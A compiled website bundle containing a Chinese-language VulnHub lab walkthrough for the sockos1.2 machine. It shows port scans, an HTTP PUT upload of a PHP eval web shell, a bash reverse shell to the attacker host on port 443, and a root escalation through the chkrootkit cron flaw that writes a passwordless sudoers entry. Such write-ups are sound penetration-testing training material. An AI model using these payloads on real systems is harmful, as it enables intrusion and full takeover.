"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[922],{28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>c});var t=r(96540);const s={},o=t.createContext(s);function a(e){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),t.createElement(o.Provider,{value:n},e.children)}},52918:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>i,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"VulnHub/Virtual Machines/sockos1.2","title":"sockos1.2","description":"Port Scan","source":"@site/docs/VulnHub/Virtual Machines/sockos1.2.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/sockos1.2","permalink":"/docs/VulnHub/Virtual Machines/sockos1.2","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/sockos1.2.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"sockos1.1-shellshock","permalink":"/docs/VulnHub/Virtual Machines/sockos1.1-shellshock"},"next":{"title":"vulnosv2","permalink":"/docs/VulnHub/Virtual Machines/vulnosv2"}}');var s=r(74848),o=r(28453);const a={},c=void 0,i={},l=[{value:"Port Scan",id:"port-scan",level:3},{value:"Web",id:"web",level:3},{value:"Privilege Escalation",id:"privilege-escalation",level:3}];function d(e){const n={blockquote:"blockquote",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h3,{id:"port-scan",children:"Port Scan"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Sat Nov  9 09:41:09 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.27.5\r\nNmap scan report for 192.168.27.5\r\nHost is up (0.00084s latency).\r\nNot shown: 65533 filtered tcp ports (no-response)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\nMAC Address: 00:0C:29:75:44:54 (VMware)\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Sat Nov  9 09:43:06 2024 as: nmap -sT -sV -sC -O -p22,80 -oN nmap_results/detils_scan 192.168.27.5\r\nNmap scan report for 192.168.27.5\r\nHost is up (0.00084s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)\r\n|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)\r\n|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)\r\n80/tcp open  http    lighttpd 1.4.28\r\n|_http-title: Site doesn't have a title (text/html).\r\n|_http-server-header: lighttpd/1.4.28\r\nMAC Address: 00:0C:29:75:44:54 (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (89%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%), Linux 4.10 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nmap --script=vuln -p80 -oN nmap_results/script_scan 192.168.27.5\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nikto -h http://192.168.27.5\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241110141501506.png",alt:"image-20241110141501506"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6709\u4e2a",(0,s.jsx)(n.code,{children:"test"}),"\u76ee\u5f55"]}),"\n",(0,s.jsx)(n.h3,{id:"web",children:"Web"}),"\n",(0,s.jsxs)(n.p,{children:["test\u76ee\u5f55\u4e0b\u652f\u6301",(0,s.jsx)(n.code,{children:"put"}),"\u65b9\u6cd5"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"PUT /test/shell.php HTTP/1.1\r\nHost: 192.168.27.5\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n\r\n<?php eval($_POST[1]);\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"/bin/bash -i >& /dev/tcp/192.168.27.3/443 0>&1\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7aef\u53e3443\u53ef\u4ee5\u63a5\u6536\u5230shell"}),"\n",(0,s.jsx)(n.h3,{id:"privilege-escalation",children:"Privilege Escalation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"www-data@ubuntu:/tmp$ ls -lah /etc/cron*\r\nls -lah /etc/cron*\r\n-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab\r\n\r\nls: cannot open directory /etc/cron.d: Permission denied\r\n/etc/cron.daily:\r\ntotal 72K\r\ndrwxr-xr-x  2 root root 4.0K Apr 12  2016 .\r\ndrwxr-xr-x 84 root root 4.0K Nov  9 15:53 ..\r\n-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder\r\n-rwxr-xr-x  1 root root  16K Nov 15  2013 apt\r\n-rwxr-xr-x  1 root root  314 Apr 18  2013 aptitude\r\n-rwxr-xr-x  1 root root  502 Mar 31  2012 bsdmainutils\r\n-rwxr-xr-x  1 root root 2.0K Jun  4  2014 chkrootkit\r\n-rwxr-xr-x  1 root root  256 Oct 14  2013 dpkg\r\n-rwxr-xr-x  1 root root  338 Dec 20  2011 lighttpd\r\n-rwxr-xr-x  1 root root  372 Oct  4  2011 logrotate\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5b9a\u65f6\u4efb\u52a1\u4e2d\uff0c\u6709",(0,s.jsx)(n.code,{children:"chkrootkit"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"www-data@ubuntu:/tmp$ chkrootkit -V\r\nchkrootkit -V\r\nchkrootkit version 0.49\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241110142942537.png",alt:"image-20241110142942537"})}),"\n",(0,s.jsx)(n.p,{children:"\u6709\u4e00\u4e2a\u63d0\u6743\u6f0f\u6d1e"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u5728/tmp\u76ee\u5f55\u4e0b\uff0c\u521b\u5efa\u4e00\u4e2aupdate\u6587\u4ef6\uff0c\u4f5c\u4e3a\u5b9a\u65f6\u4efb\u52a1\u7684chkrootkit\u4f1a\u8fd0\u884cupdate\u6587\u4ef6\uff08\u4ee5root\u8eab\u4efd\uff09"}),"\n",(0,s.jsx)(n.p,{children:"\u5c06sudo\u6743\u9650\u7ed9www-data\u5373\u53ef"}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'www-data@ubuntu:/tmp$ echo \'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers\' > update\r\n updatecho "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers\' > \r\nwww-data@ubuntu:/tmp$ cat update\r\ncat update\r\necho "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e",(0,s.jsx)(n.code,{children:"sudo bash"}),"\u62ff\u5230root"]})]})}function p(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}}}]);